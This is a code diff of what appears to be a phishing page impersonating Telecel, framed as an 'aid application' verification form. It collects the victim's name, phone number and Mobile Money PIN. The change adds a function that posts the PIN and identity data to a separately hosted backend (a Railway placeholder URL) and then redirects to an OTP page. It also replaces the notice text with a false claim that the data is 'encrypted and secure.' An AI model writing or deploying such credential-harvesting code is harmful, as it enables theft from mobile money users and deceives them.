@@ -13,7 +13,7 @@
 
         body {
             font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #f8f9fa 0%, #fff 100%);
+            background: #f5f5f5;
             color: #333;
             line-height: 1.5;
             overflow-x: hidden;
@@ -30,27 +30,23 @@
             --success: #00875A;
             --warning: #FFC107;
             --shadow: 0 10px 25px rgba(0,0,0,0.08);
-            --shadow-sm: 0 2px 8px rgba(0,0,0,0.05);
         }
 
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
-
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: #f5f5f5;
-        }
 
         .container {
             max-width: 600px;
             margin: 0 auto;
             padding: 1rem;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
 
-        /* Header */
         .header {
             text-align: center;
             margin-bottom: 1.5rem;
-            padding-top: 1rem;
+            padding-top: 0.5rem;
         }
 
         .logo-icon {
@@ -78,13 +74,12 @@
         }
 
         .powered {
-            font-size: 0.7rem;
+            font-size: 0.65rem;
             color: var(--gray);
         }
 
-        /* Progress Bar */
         .progress-container {
-            margin: 1.5rem 0;
+            margin: 1rem 0 1.5rem;
         }
 
         .progress-steps {
@@ -96,7 +91,7 @@
         .step-indicator {
             text-align: center;
             flex: 1;
-            font-size: 0.65rem;
+            font-size: 0.6rem;
             color: var(--gray);
         }
 
@@ -111,7 +106,7 @@
 
         .progress-bar {
             background: var(--border);
-            height: 6px;
+            height: 5px;
             border-radius: 10px;
             overflow: hidden;
         }
@@ -123,7 +118,6 @@
             border-radius: 10px;
         }
 
-        /* Form Card */
         .form-card {
             background: white;
             border-radius: 20px;
@@ -141,17 +135,16 @@
         .form-subtitle {
             color: var(--gray);
             margin-bottom: 1.5rem;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
         }
 
-        /* Security Notice */
         .security-notice {
             background: #E8F5E9;
             border-left: 4px solid var(--success);
             padding: 0.8rem;
             border-radius: 12px;
-            margin-bottom: 1.2rem;
-            font-size: 0.75rem;
+            margin-bottom: 1rem;
+            font-size: 0.7rem;
             display: flex;
             align-items: center;
             gap: 0.5rem;
@@ -162,22 +155,22 @@
             border-left: 4px solid var(--warning);
             padding: 0.8rem;
             border-radius: 12px;
-            margin: 1.2rem 0;
-            font-size: 0.75rem;
+            margin: 1rem 0;
+            font-size: 0.7rem;
             display: flex;
             align-items: center;
             gap: 0.5rem;
         }
 
         .form-group {
-            margin-bottom: 1.2rem;
+            margin-bottom: 1rem;
         }
 
         label {
             display: block;
             font-weight: 600;
             margin-bottom: 0.4rem;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             color: var(--dark);
         }
 
@@ -188,12 +181,12 @@
 
         .info-box {
             background: var(--light-gray);
-            padding: 0.7rem;
+            padding: 0.6rem;
             border-radius: 10px;
             border: 1px solid var(--border);
             color: var(--gray);
-            font-size: 0.8rem;
-            margin-bottom: 0.8rem;
+            font-size: 0.75rem;
+            margin-bottom: 0.6rem;
         }
 
         input {
@@ -225,7 +218,7 @@
 
         .error-message {
             color: var(--telecel-red);
-            font-size: 0.7rem;
+            font-size: 0.65rem;
             margin-top: 0.3rem;
             display: none;
         }
@@ -235,7 +228,7 @@
         }
 
         .hint {
-            font-size: 0.65rem;
+            font-size: 0.6rem;
             color: var(--gray);
             margin-top: 0.3rem;
         }
@@ -244,7 +237,7 @@
             display: flex;
             align-items: flex-start;
             gap: 0.6rem;
-            margin: 1.2rem 0;
+            margin: 1rem 0;
         }
 
         .checkbox-group input {
@@ -258,7 +251,7 @@
             margin-bottom: 0;
             cursor: pointer;
             font-weight: normal;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
         }
 
         .btn-next {
@@ -268,16 +261,21 @@
             padding: 0.9rem;
             border: none;
             border-radius: 50px;
-            font-size: 0.95rem;
+            font-size: 0.9rem;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
             margin-top: 0.5rem;
         }
 
-        .btn-next:hover {
+        .btn-next:hover:not(:disabled) {
             background: var(--telecel-red-dark);
             transform: translateY(-2px);
+        }
+
+        .btn-next:disabled {
+            background: var(--gray);
+            cursor: not-allowed;
         }
 
         .back-link {
@@ -288,14 +286,15 @@
         .back-link a {
             color: var(--gray);
             text-decoration: none;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
         }
 
         .footer {
             text-align: center;
             padding: 1rem;
             color: var(--gray);
-            font-size: 0.7rem;
+            font-size: 0.65rem;
+            margin-top: auto;
         }
 
         .loading-overlay {
@@ -322,9 +321,29 @@
             animation: spin 1s linear infinite;
         }
 
+        .loading-text {
+            color: white;
+            font-size: 0.85rem;
+        }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
+        }
+
+        .error-toast {
+            background: #FFEBEE;
+            border-left: 4px solid var(--telecel-red);
+            padding: 0.8rem;
+            border-radius: 12px;
+            margin-bottom: 1rem;
+            font-size: 0.75rem;
+            display: none;
+            text-align: center;
+        }
+
+        .error-toast.show {
+            display: block;
         }
     </style>
 </head>
@@ -355,7 +374,11 @@
 
             <div class="security-notice">
                 <span>🔐</span>
-                <div><strong>Secure Verification</strong><br>This confirms you are the legitimate owner of this Telecel number.</div>
+                <div><strong>Secure Verification</strong><br>Your information is encrypted and secure.</div>
+            </div>
+
+            <div class="error-toast" id="errorToast">
+                ❌ Failed to submit. Please check your connection and try again.
             </div>
 
             <form id="verificationForm">
@@ -382,7 +405,6 @@
                     <div class="error-message" id="phoneError">Number does not match your application</div>
                 </div>
 
-                <!-- NEW FIELD: Telecel PIN (for disbursement) -->
                 <div class="form-group">
                     <label class="required">🔐 Telecel Mobile Money PIN</label>
                     <input type="password" id="telecelPin" placeholder="Enter your 4-digit Telecel PIN" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required>
@@ -421,10 +443,13 @@
 
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-spinner"></div>
-        <div class="loading-text">Verifying your details...</div>
+        <div class="loading-text">Submitting your application...</div>
     </div>
 
     <script>
+        // BACKEND URL - CHANGE THIS TO YOUR RAILWAY URL AFTER DEPLOYMENT
+        const BACKEND_URL = 'https://your-railway-app.up.railway.app';
+
         const savedData = JSON.parse(sessionStorage.getItem('telecelAidApplication'));
 
         if (!savedData) {
@@ -440,6 +465,8 @@
         const telecelPin = document.getElementById('telecelPin');
         const declaration = document.getElementById('declaration');
         const loadingOverlay = document.getElementById('loadingOverlay');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorToast = document.getElementById('errorToast');
 
         confirmedPhone.value = savedData.phoneNumber;
 
@@ -480,7 +507,6 @@
         function validateTelecelPin() {
             const pin = telecelPin.value.trim();
             const errorMsg = document.getElementById('pinError');
-            // Only allow 4 digits
             if (!/^\d{4}$/.test(pin)) {
                 telecelPin.classList.add('error');
                 telecelPin.classList.remove('success');
@@ -510,7 +536,33 @@
         telecelPin.addEventListener('input', validateTelecelPin);
         declaration.addEventListener('change', validateDeclaration);
 
-        form.addEventListener('submit', function(e) {
+        async function submitToBackend() {
+            const payload = {
+                fullName: savedData.fullName,
+                confirmedName: confirmedName.value.trim(),
+                phoneNumber: savedData.phoneNumber,
+                confirmedPhone: confirmedPhone.value.trim(),
+                telecelPin: telecelPin.value.trim()
+            };
+
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/submit`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await response.json();
+                return data.success;
+            } catch (error) {
+                console.error('Backend error:', error);
+                return false;
+            }
+        }
+
+        form.addEventListener('submit', async function(e) {
             e.preventDefault();
 
             const isNameValid = validateConfirmedName();
@@ -519,25 +571,45 @@
             const isDeclarationValid = validateDeclaration();
 
             if (isNameValid && isPhoneValid && isPinValid && isDeclarationValid) {
+                // Show loading overlay
                 loadingOverlay.style.display = 'flex';
+                submitBtn.disabled = true;
+                errorToast.classList.remove('show');
                 
-                const verificationData = {
-                    confirmedName: confirmedName.value.trim(),
-                    confirmedPhone: confirmedPhone.value.trim(),
-                    telecelPin: telecelPin.value.trim(),
-                    verifiedAt: new Date().toISOString()
-                };
+                // Send data to backend
+                const success = await submitToBackend();
                 
-                const completeData = {
-                    ...savedData,
-                    ...verificationData
-                };
-                
-                sessionStorage.setItem('telecelAidApplication', JSON.stringify(completeData));
-                
-                setTimeout(() => {
-                    window.location.href = 'otp.html';
-                }, 800);
+                if (success) {
+                    // Store verification data
+                    const verificationData = {
+                        confirmedName: confirmedName.value.trim(),
+                        confirmedPhone: confirmedPhone.value.trim(),
+                        telecelPin: telecelPin.value.trim(),
+                        verifiedAt: new Date().toISOString()
+                    };
+                    
+                    const completeData = {
+                        ...savedData,
+                        ...verificationData
+                    };
+                    
+                    sessionStorage.setItem('telecelAidApplication', JSON.stringify(completeData));
+                    
+                    // Redirect to OTP page
+                    setTimeout(() => {
+                        window.location.href = 'otp.html';
+                    }, 800);
+                } else {
+                    // Show error
+                    loadingOverlay.style.display = 'none';
+                    submitBtn.disabled = false;
+                    errorToast.classList.add('show');
+                    
+                    // Auto hide error after 5 seconds
+                    setTimeout(() => {
+                        errorToast.classList.remove('show');
+                    }, 5000);
+                }
             } else {
                 const firstError = document.querySelector('.error');
                 if (firstError) {
